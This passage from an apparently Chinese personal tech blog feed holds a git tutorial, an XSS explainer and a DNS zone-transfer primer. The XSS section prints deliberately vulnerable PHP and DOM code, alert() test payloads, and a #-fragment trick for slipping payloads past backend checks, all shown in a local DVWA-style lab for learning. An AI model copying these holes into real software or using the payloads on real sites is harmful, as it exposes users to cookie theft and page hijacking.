<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git commit -m &lt;message&gt;</span><br></pre></td></tr></table></figure>

<p>在此过程中，为了时刻掌握仓库状态，可以使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure>

<p>也可以查看提交日志</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log</span><br><span class="line">或 git log --all --graph --decorate (更好的显示)</span><br></pre></td></tr></table></figure>

<p>如果一次add后还没来得及commit，此时后悔了，则可以把文件从暂存区撤下，但是文件内容还是更改之后的形式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git reset &lt;filename&gt;</span><br></pre></td></tr></table></figure>

<h3 id="文件状态"><a href="#文件状态" class="headerlink" title="文件状态"></a>文件状态</h3><p><img src="https://s2.ax1x.com/2020/03/10/8PqITU.png" alt="8PqITU.png"></p>
<p>文件一共有四种状态</p>
<p>untracked：表示新建立的文件，之前没有被commit过</p>
<p>unmodified：表示仓库文件，文件被commit后的状态</p>
<p>modified：文件被更改之后，内容有了变更的状态</p>
<p>staged：暂存区文件，等待commit一起提交</p>
<h3 id="工作区和版本库"><a href="#工作区和版本库" class="headerlink" title="工作区和版本库"></a>工作区和版本库</h3><p>图示的很明晰</p>
<p><img src="https://s2.ax1x.com/2020/03/10/8PvOZq.png" alt="8PvOZq.png"></p>
<p><img src="https://s2.ax1x.com/2020/03/10/8PvzJU.png" alt="8PvzJU.png"></p>
<h3 id="回退"><a href="#回退" class="headerlink" title="回退"></a>回退</h3><p>当commit提交到仓库的时候，想回到上一个版本就可以使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git reset &lt;commitID&gt;</span><br></pre></td></tr></table></figure>

<p>这里commitID是commit每个操作的hash值，也有另一种表示方式</p>
<p>在Git中，用<code>HEAD</code>表示当前版本，上一个版本就是<code>HEAD^</code>，上上一个版本就是<code>HEAD^^</code>，当然往上100个版本写100个<code>^</code>比较容易数不过来，所以写成<code>HEAD~100</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git reset --hard HEAD^</span><br></pre></td></tr></table></figure>

<p>表示返回上一个版本，–hard是一个参数</p>
<p>现在来说明reset的参数：</p>
<blockquote>
<p>–hard：不保留所有变更</p>
<p>–soft：保留变更且变更内容处于staged</p>
<p>–mixed：保留变更且变更内容处于modified</p>
<p>（不带参数，默认就是mixed）</p>
</blockquote>
<p>Git提供了一个命令，用来记录你的每一次命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git reflog</span><br></pre></td></tr></table></figure>

<h3 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout -b &lt;name&gt;&lt;template&gt;</span><br><span class="line">或者 git switch -c &lt;name&gt;</span><br></pre></td></tr></table></figure>

<p>该命令用于新建一个分支，name是新建分支的名称，template为模板分支，如果不填，则以现在分支为模板</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git branch</span><br></pre></td></tr></table></figure>

<p>用于显示所有的分支，当前分支前面会标一个<code>*</code>号。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout &lt;branchName&gt;</span><br></pre></td></tr></table></figure>

<p>用于切换分支</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git branch -d &lt;branchName&gt;</span><br></pre></td></tr></table></figure>

<p>用于删除分支</p>
<h3 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h3><p>合并分支变更</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git merge &lt;branchName&gt;</span><br></pre></td></tr></table></figure>

<p>合并有很多方式，具体内容使用可知</p>
<h3 id="解决冲突"><a href="#解决冲突" class="headerlink" title="解决冲突"></a>解决冲突</h3><p>当两个分支都做了修改，现在要将其合并一起，就会产生冲突，必须手动解决冲突后再提交</p>
<p><code>git status</code>也可以告诉我们冲突的文件</p>
<p>Git用<code>&lt;&lt;&lt;&lt;&lt;&lt;&lt;</code>，<code>=======</code>，<code>&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code>标记出不同分支的内容</p>
<h2 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h2><p>将远程仓库下载到本地，远程仓库的默认名称是<code>origin</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone &lt;Clone with SSH &gt;</span><br></pre></td></tr></table></figure>

<p>要查看远程库的信息，用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remote</span><br></pre></td></tr></table></figure>

<p>或者，显示更详细的信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remote -v</span><br></pre></td></tr></table></figure>

<p>上面显示了可以抓取和推送的<code>origin</code>的地址。如果没有推送权限，就看不到push的地址。</p>
<p>可以在本地自建分支</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout -b &lt;branchName&gt;</span><br></pre></td></tr></table></figure>

<p>然后将分支上传到远程仓库</p>
<p>第一次上传会没有上流分支而失败，所以使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push --set-upstream origin &lt;branchName&gt;</span><br></pre></td></tr></table></figure>

<p>之后就可用<code>git push</code>上传更改到上流分支</p>
<h2 id="协同开发"><a href="#协同开发" class="headerlink" title="协同开发"></a>协同开发</h2><p>当多人对一个远程仓库开发时，都会在本地新建一个分支并在远程仓库上传分支，此时远程仓库是不断更新的，因为有多人不同时<code>git push</code></p>
<p>想要获得此时远程仓库的状态，可使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git fetch</span><br></pre></td></tr></table></figure>

<p>如果此时发现有人在远程仓库新建了一个分支，而这个分支是本地没有的，则可以使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout &lt;branchName&gt;</span><br></pre></td></tr></table></figure>

<p>切换并下载该分支</p>
<p>如果发现你的本地仓库比远程仓库老旧，需要更新，可以使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git pull</span><br></pre></td></tr></table></figure>

<p>注意：如果你在<code>git push</code>时发现远程仓库是最新版，即别人<code>git push</code>了，而你的更改是对上一版的更改，此时就会产生冲突，你可以<code>git pull</code>将最新版下载下来，手动在本地解决冲突，然后再<code>git push</code></p>
<h2 id="变基"><a href="#变基" class="headerlink" title="变基"></a>变基</h2><p>实际应用中，或许存在这种情况，当你使用的分支源于某个模板分支，你已经在自己分支上进行过commit了，发现模板分支有被commit更新过，这个时候你想要将自己分支源于旧模板分支的base更新为新base，并且你提交在自己分支的commit要在新base之后，此时，你就可以用到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git rebase &lt;BaseBranchName&gt;</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<p><img src="https://s2.ax1x.com/2020/03/11/8kLsdx.png" alt="8kLsdx.png"></p>
<p>若此时在bc分支进行<code>git rebase master</code>会出现冲突，此时解决冲突后，<code>git add .</code>将变更存入暂存区，使用</p>
<p><code>git rebase --continue</code>继续下一个节点的rebase，以上操作直到变基完成，</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.bilibili.com/video/av94549514" target="_blank" rel="noopener">https://www.bilibili.com/video/av94549514</a></p>
<p><a href="https://www.liaoxuefeng.com/wiki/896043488029600" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/896043488029600</a></p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS跨站脚本漏洞</title>
    <url>/2020/03/03/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        XSS(cross site scripting)即跨站脚本攻击，是最常见的web应用程序漏洞之一。</p>
<p>​        XSS是指攻击者在网页嵌入客户端脚本，通常使用的是JavaScript编写的恶意代码，当用户浏览网页时，恶意代码将在用户的浏览器上执行。</p>
<p>​        XSS属于前端漏洞，受害者是用户，但是网站的管理人员也是用户之一，也有可能被攻击者拿到管理员权限，作为跳板实施攻击。</p>
<p>​        本篇文章用于对XSS原理解析和对各种类型的XSS介绍。</p>
<a id="more"></a>

<h1 id="XSS原理解析"><a href="#XSS原理解析" class="headerlink" title="XSS原理解析"></a>XSS原理解析</h1><p>​        XSS是在网页输入口插入用脚本语言(一般是JavaScript)，如果服务端不对用户输入进行严格过滤且返回给客户端输出，那么就有可能造成跨站脚本漏洞。</p>
<p>​        JavaScript编写的脚本可以用来获取用户cookie，改变网页内容，URL跳转，那么存在XSS漏洞的网站，就可以盗取用户的cookie，黑掉页面，导航到恶意网站，而攻击者只需要在网页中注入JavaScript代码即可。</p>
<p>​        用本地搭建的网站环境测试：</p>
<p><img src="https://s2.ax1x.com/2020/03/04/3IeAZd.png" alt="3IeAZd.png"></p>
<p>get方式提交测试代码：</p>
<p><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>
<p><img src="https://s2.ax1x.com/2020/03/04/3IZT2T.png" alt="3IZT2T.png"></p>
<p>利用post方式提交：</p>
<p><img src="https://s2.ax1x.com/2020/03/04/3IemJP.png" alt="3IemJP.png"></p>
<p>网页源代码为：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>XSS测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>输入文本<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"xss.php"</span> <span class="attr">method</span>=<span class="string">"GET"</span> <span class="attr">enctype</span>=<span class="string">"application/x-www-form-urlencoded"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span>get方式提交<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"gettxt"</span> <span class="attr">id</span>=<span class="string">"gettxt"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"xss.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"application/x-www-form-urlencoded"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span>POST方式提交<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"posttxt"</span> <span class="attr">id</span>=<span class="string">"posttxt"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>php代码为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;XSS测试&lt;&#x2F;title&gt;</span><br><span class="line">        &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h3&gt;输出结果：&lt;&#x2F;h3&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&quot;gettxt&quot;])) &#123;</span><br><span class="line">    echo $_GET[&quot;gettxt&quot;];</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_POST[&quot;posttxt&quot;])) &#123;</span><br><span class="line">    echo $_POST[&quot;posttxt&quot;];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到上述服务器对用户输入没有进行任何防护，直接在客户端上输出，就有了XSS漏洞。</p>
<p>JavaScript在HTML中不仅由上述方式加载脚本，还有：</p>
<blockquote>
<ol>
<li><code>&lt;script&gt;脚本语句&lt;/script&gt;</code></li>
<li><code>&lt;script type=&quot;text/javascript&quot; src=&quot;js文件地址&quot;&gt;&lt;/script&gt;</code></li>
<li><code>&lt;input type=&quot;button&quot; value=&quot;点击&quot; onclick=&quot;var a=&#39;test&#39;;alert(a)&quot;&gt;</code></li>
</ol>
</blockquote>
<p>注意：</p>
<ul>
<li><p>在2中JavaScript加载外部的代码文件可以是任意扩展名(无扩展名也可以)，如：</p>
<p><code>&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.example.com/x.jpg&quot;&gt;&lt;/script&gt;</code></p>
<p>即使文件扩展名为jpg，但是只要文件中包含js代码就会被执行。</p>
</li>
<li><p>在3中以HTML事件处理器中写入js代码，这里不光有onclick还有更多类似onmouseover，onmouseout等多种事件，对事件的如何触发也有不同，如：</p>
<p><code>&lt;button onclick=&quot;this.innerHTML=Date()&quot;&gt;现在的时间是?&lt;/button&gt;</code></p>
</li>
</ul>
<h1 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h1><p>​        XSS总共分为三类：</p>
<blockquote>
<ol>
<li>反射型XSS</li>
<li>存储型XSS</li>
<li>DOM型XSS</li>
</ol>
</blockquote>
<h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>​        反射型XSS，也被称为非持久型XSS，是最容易出现的一种XSS。用户点击一个攻击者生成的具有js代码的URL，服务器没有对URL严格过滤返回给用户，用户的浏览器执行js代码，最终造成XSS漏洞。</p>
<p>服务器代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $username = $_GET[<span class="string">'username'</span>];</span><br><span class="line">	<span class="keyword">echo</span> $username;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>则攻击者可以生成具有js代码的URL：</p>
<p><code>http://www.example.com/xss.php?username=&lt;script&gt;XSS恶意代码&lt;/script&gt;</code></p>
<p>用户的点击后，就会执行XSS恶意代码。</p>
<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>​        存储型XSS又称为持久性XSS，是最危险的一种跨站脚本，具有更高的隐蔽性，危害性更大。</p>
<p>​        允许用户存储数据的web应用程序都有可能会出现存储型XSS漏洞，当攻击者提交一段XSS代码后，服务器将其保存在数据库中，在正常用户访问某个页面时，这段代码将会被程序读出来响应给浏览器，造成XSS攻击。</p>
<p>​        这里用DVWA的存储型XSS(LOW)示例：</p>
<p><img src="https://s2.ax1x.com/2020/03/06/3HzhpF.png" alt="3HzhpF.png"></p>
<p>模拟了一个网站的评论区，这里注入XSS代码：</p>
<p><img src="https://s2.ax1x.com/2020/03/04/3ItVGF.png" alt="3ItVGF.png"></p>
<p>最终注入成功，因为XSS代码保存到数据库中，所以用户每次登陆这个界面都会触发代码：</p>
<p><img src="https://s2.ax1x.com/2020/03/04/3ItZ24.png" alt="3ItZ24.png"></p>
<h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>​        DOM型XSS是基于DOM文档对象模型的一种漏洞。严格地说，DOM型XSS其实算反射型XSS，区别在于DOM型XSS并不会和后台进行交互，是完完全全的Web前端安全问题，要做防御也只能在客户端上进行防御。</p>
<p>​        首先，客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它并不与服务端进行交互而是从客户端获得DOM中的数据（如从URL中获取数据）并在本地执行；其次，浏览器用户可以操纵DOM中的一些对象如URL、location等；因此，当攻击者可以控制一些DOM对象、输入一些恶意JS代码，而客户端的脚本并没有对用户输入内容进行有效的过滤就传入一些执行危险操纵的函数如eval等或直接输出到页面时，就会导致DOM型XSS漏洞的存在。</p>
<p><strong>DOM</strong></p>
<p>​        DOM(Document Object Model)，文档对象模型，是HTML和XML文档的编程接口。</p>
<p>​        其中HTML DOM定义了所有HTML元素的对象和属性，以及访问它们的方法。换言之，HTML DOM是关于如何获取、修改、添加或删除HTML元素的标准。关于DOM树的操作方法之后会介绍。</p>
<p>​        DOM以树结构表达HTML文档。</p>
<p><img src="https://s2.ax1x.com/2020/03/04/3Iblwj.png" alt="3Iblwj.png"></p>
<p>下面是一个包含DOM型XSS漏洞的HTML页面：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM XSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> pos=<span class="built_in">document</span>.URL.indexOf(<span class="string">"name="</span>)+<span class="number">5</span>;</span></span><br><span class="line"><span class="javascript">	<span class="built_in">document</span>.write(<span class="built_in">decodeURI</span>(<span class="built_in">document</span>.URL.substring(pos,<span class="built_in">document</span>.URL.length)));</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​        上述HTML文档中的JavaScript代码会将URL中参数 ‘name=’ 内容截取下来，写入到DOM结构中，也就是HTML文档中，其功能的实现全都在前端JS中进行、未与后台进行任何交互。</p>
<p><img src="https://s2.ax1x.com/2020/03/05/3TP06H.png" alt="3TP06H.png"></p>
<p>​        测试payload：</p>
<p>​        <code>http://www.example.com/domxss.html?name=&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p>​        虽然会用get方式提交name数据，但是实际实现是在前端的script代码中，也可以为了绕过后端服务器的检测，使用如下payload：</p>
<p>​        <code>http://www.example.com/domxss.html#name=&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p>​        其中#号表示在URL中#后面的内容不会传到后端处理，只在前端使用，这样就可以隐蔽恶意代码不被后端检测出来。</p>
<p><img src="https://s2.ax1x.com/2020/03/05/3TPBXd.png" alt="3TPBXd.png"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>DNS服务以及DNS域传送漏洞</title>
    <url>/2020/03/01/DNS%E6%9C%8D%E5%8A%A1%E4%BB%A5%E5%8F%8ADNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        疫情影响，宅在家里，开学推迟，要上网课，有课名叫，网络攻防，要上实验，网上靶机，可是靶机，实在不行，自己搭建，两眼蒙蔽，从头做起，选择放弃。(哭)</p>
<p>​        这次要做的实验内容和DNS域传送漏洞有关，其实也是用工具进行信息收集，之前忽略了信息收集这块，觉得不太重要，但是现在回头来看，这是最重要的一部分，自己也回头补补。DNS域名查询也很重要，要不渗透前都不知道目标是谁。</p>
<a id="more"></a>

<h1 id="DNS服务：因特网的目录服务"><a href="#DNS服务：因特网的目录服务" class="headerlink" title="DNS服务：因特网的目录服务"></a>DNS服务：因特网的目录服务</h1><p>​        之前看过《计算机网络：自顶向下方法》这本书对DNS的讲解，确实不错，但是当时读的有些晦涩难懂，现在回头去看有些地方确实重新理解到了。现在重新理解回忆一波DNS。</p>
<h2 id="DNS定义"><a href="#DNS定义" class="headerlink" title="DNS定义"></a>DNS定义</h2><p>​        在因特网的主机中，有一种标识方式就是用它的主机名(hostname)，例如：<code>www.baidu.com</code>，<code>www.4399.com</code>等，但是主机名并没有透漏多少在因特网中的位置信息，实际上在因特网上的主机通信是用IP地址来进行的。人们喜欢用主机名的标识方式使用，而路由器喜欢定长，有层次结构的IP地址。为了折中，就产生了DNS(Domain Name System)域名系统，用于进行主机名到IP地址转换的目录结构。</p>
<p>​        DNS是：</p>
<ol>
<li>一个由分层的DNS服务器实现的分布式数据库。</li>
<li>一个使得主机能查询分布式数据库的应用层协议。</li>
</ol>
<p>​        DNS服务器通常是运行BIND软件的UNIX机器，DNS在进行区域传输的时候使用TCP协议，其它时候则使用UDP协议，使用TCP53端口和UDP53端口。(DNS只有两种报文，查询/回答报文)</p>
<h2 id="DNS工作过程"><a href="#DNS工作过程" class="headerlink" title="DNS工作过程"></a>DNS工作过程</h2><p>例如用户在浏览器中请求URL：<code>www.example.com/index.html</code>则会发生以下过程：</p>
<ol>
<li>浏览器从上述URL中抽取主机名<code>www.example.com</code>并交给同一机器上运行的DNS客户端</li>
<li>DNS客户端向DNS服务器发送一个包含主机名的请求</li>
<li>DNS客户端最终会收到一份回答报文，其中含有对应与该主机名的IP地址</li>
<li>浏览器收到来自DNS客户端的该IP地，它能向位于该IP地址的80端口的HTTP服务器进程HTTP请求</li>
</ol>
<h2 id="DNS的其他服务"><a href="#DNS的其他服务" class="headerlink" title="DNS的其他服务"></a>DNS的其他服务</h2><ul>
<li>主机别名：有复杂主机名的主机可以拥有一个或多个别名，例如一台规范主机名为relay1.west-coast.enterprise.com可能有两个别名<code>enterprise.com</code>或者<code>www.enterprise.com</code>。应用程序可以调用主机别名来获得规范主机名和IP地址</li>
<li>邮件服务器别名：例如<code>example@gmail.com</code>，中邮件服务器别名为<code>gmail.com</code>比它的规范主机名好记的多</li>
<li>负载分配：用于冗余的服务器或者具有CDN的服务器上。要访问的站点被分布在多台服务器上，具有不同的IP地址，因此一个IP地址集合与同一个规范主机名所联系。当客户对其发送一个DNS请求时候，DNS服务器用IP地址的整个集合进行响应，但在每个回答中循环这些地址次序。</li>
</ul>
<h2 id="DNS组织方式"><a href="#DNS组织方式" class="headerlink" title="DNS组织方式"></a>DNS组织方式</h2><h3 id="DNS结构"><a href="#DNS结构" class="headerlink" title="DNS结构"></a>DNS结构</h3><p>​        从DNS的工作方式来看，DNS不可能是单一集中的数据库，而是使用大量的DNS服务器，以层次方式组织。大致来说DNS有三种基本类型：根DNS服务器，顶级域(TLD),DNS服务器，权威服务器。</p>
<p><img src="https://s2.ax1x.com/2020/03/01/3cJecF.png" alt="3cJecF.png"></p>
<p>​        如果你的请求没有命中本地DNS服务器缓存，那么这个缓存服务器就会自己进行一次标准查询，然后再把结果缓存起来，简单来说就是从根服务器开始一级一级的问。我们以前经常谈到根服务器的重要性其实就体现在这里了，它保留了对所有域名的起始解释权。</p>
<p>​        根服务器拥有一切域名的起始解释权，但是如果你去问根服务器它是不会直接告诉你最终答案的。因为如果它要存储所有的记录，那它也太累了，这个负载和开销是惊人的。那它会告诉你什么呢？它会告诉你应该去问谁，也就是它授权下一级服务器来解答你的问题。拟人化这个过程:</p>
<ol>
<li>我（本地DNS服务器）: root, root 告诉我， example.com 怎么走？</li>
<li>root: 呵呵，你可以去问.com的dns服务器，地址是xxxxxx</li>
<li>我: .com, .com 告诉我，example.com 怎么走？</li>
<li>.com: 呵呵，你可以去问example.com的dns服务器(dnspod之类的)，地址是xxxxxx</li>
<li>我: dnspod, dnspod 告诉我，example.com 怎么走？</li>
<li>dnspod: 拿着 xxxxxx，走你</li>
</ol>
<p>​        这个例子假设TLD服务器直到用于主机的权威DNS服务器的IP地址，一般来说，这种假设不总是正确，相反，TLD服务器只知道某个中间的DNS服务器，该中间的DNS服务器依次才知道用于该主机的权威DNS服务器。上述例子利用了递归查询和迭代查询，从自己主机到本地DNS服务器查询是递归的，本地DNS服务器查询是迭代的。</p>
<h3 id="DNS缓存"><a href="#DNS缓存" class="headerlink" title="DNS缓存"></a>DNS缓存</h3><p>​        实际中，为了改善时延和减少因特网中DNS报文数量，DNS广泛采用了缓存技术。在一个请求链中，某个DNS服务器在收到DNS回答报文时，它能将映射缓存到服务器中，缓存并不是永久的，DNS服务器在一段时间后将丢弃缓存的信息。本地DNS服务器也能够缓存TLD服务器的IP地址，因此允许本地服务器DNS查询绕过查询链中的根DNS服务器。</p>
<h2 id="DNS记录"><a href="#DNS记录" class="headerlink" title="DNS记录"></a>DNS记录</h2><p>​        一条DNS记录就是一个映射关系，它的大致结构是（Name,Value,Type,TTL）其中TTL是该记录的生存时间。</p>
<p>其中Type类型有多种：</p>
<blockquote>
<p>（1） <code>A</code>：地址记录（Address），返回域名指向的IP地址。</p>
<p>（2） <code>NS</code>：域名服务器记录（Name Server），返回保存下一级域名信息的服务器地址。该记录只能设置为域名，不能设置为IP地址。</p>
<p>（3）<code>MX</code>：邮件记录（Mail eXchange），返回接收电子邮件的服务器地址。</p>
<p>（4）<code>CNAME</code>：规范名称记录（Canonical Name），返回另一个域名，即当前查询的域名是另一个域名的主机别名。</p>
<p>（5）<code>PTR</code>：逆向查询记录（Pointer Record），只用于从IP地址查询域名，详见下文。</p>
</blockquote>
<h2 id="在DNS数据库中插入记录"><a href="#在DNS数据库中插入记录" class="headerlink" title="在DNS数据库中插入记录"></a>在DNS数据库中插入记录</h2><p>​    如果你刚刚创建了一个新公司，那么你必定要做的第一件事就是在注册登记机构注册域名newcompany.com，则需要向该机构提供你的基本和辅助权威DNS服务器的名字和IP地址，例如为：dns1.newcompany.com和dns2.newcompany.com以及212.212.212.1和212.212.212.2。对这两个权威DNS服务器的每一个，该机构都要确保将一个类型为NS和一个类型为A的记录输入TLD com服务器，特别是对于用于newcompany.com的基本权威服务器。</p>
<blockquote>
<p>(newcompany.com, dns1.newcompany.com, NS)</p>
<p>(dns1.newcompany.com, 212.212.212.1, A)</p>
</blockquote>
<p>​    那么此时有个新用户想要访问你的公司主页<code>www.newcompany.com</code>，那么用户的DNS客户端先向本地的DNS服务器发送请求，本地的DNS服务器向TLD com服务器发送请求(如果本地DNS服务器没有缓存TLD com服务器的地址，那么它会先向根DNS服务器发送请求TLD com服务器的地址)，TLD com服务器向本地DNS服务器回答上述的两条DNS记录，本地DNS服务器则会根据上述两条记录向公司的权威DNS服务器发送DNS请求报文，而权威DNS服务器会回答一个具有类型为A的DNS记录的DNS报文，里面含有你要请求的站点的IP地址，例如：212.212.71.4，本地的DNS服务器会把这条DNS记录发给用户的DNS客户端并且在服务器中缓存一段时间，用户则会对这个IP地址发起一个TCP连接，并在该连接上发送一个HTTP请求。</p>
<p>参考文章：    </p>
<ol>
<li><a href="https://segmentfault.com/a/1190000002578457" target="_blank" rel="noopener">https://segmentfault.com/a/1190000002578457</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2016/06/dns.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2016/06/dns.html</a></li>
</ol>
<h1 id="DNS域传送漏洞"><a href="#DNS域传送漏洞" class="headerlink" title="DNS域传送漏洞"></a>DNS域传送漏洞</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>​        DNS作为重要的互联网基础设施，难免成为黑客的重点攻击目标，服务的稳定性尤为重要。DNS服务器分为：主服务器、备份服务器和缓存服务器。在主备服务器之间同步数据库，需要使用“DNS域传送”。域传送是指后备服务器从主服务器拷贝数据，并用得到的数据更新自身数据库。</p>
<p>​        若DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。凭借这份网络蓝图，攻击者可以节省很少的扫描时间。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>域传送关键配置项为：配置位置在/etc/named.conf文件中</p>
<p>allow-transfer {ipaddress;}; 通过ip限制可进行域传送的服务器</p>
<p>allow-transfer { key transfer; }; 通过key限制可进行域传送的服务器</p>
